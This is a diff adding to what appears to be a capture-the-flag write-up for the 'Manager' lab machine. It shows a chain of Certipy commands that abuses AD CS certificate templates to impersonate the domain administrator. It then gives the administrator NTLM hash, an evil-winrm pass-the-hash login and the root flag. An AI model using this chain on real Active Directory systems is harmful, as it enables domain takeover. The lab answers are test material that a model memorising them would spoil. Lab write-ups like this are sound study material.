@@ -134,3 +134,23 @@ using Certify.exe find /vulnerable:
 
 to get privilege escalation we need Certipy tool (https://github.com/ly4k/Certipy)
 
+certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca "manager-DC01-CA" -issue-request 14 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca "manager-DC01-CA" -target manager.htb -retrieve 14
+
+it may return error
+
+in this case u need to do:
+    sudo ntpdate -u manager.htb(download ntpdate)
+
+and then we will get the administrator.pfx,with this we can get TGT ticket hash to machine using:
+    sudo certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
+
+we maybe will have to do sudo ntpdate -u manager.htb before the error disapears
+and here is the admin hash:
+    aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+
+to access the machine we gonna need the second part of this hash to enter
+
+sudo evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
+
+now Im admin, dir Desktop and get the root flag:
+    e1863778035b3db185551b5aa251e961
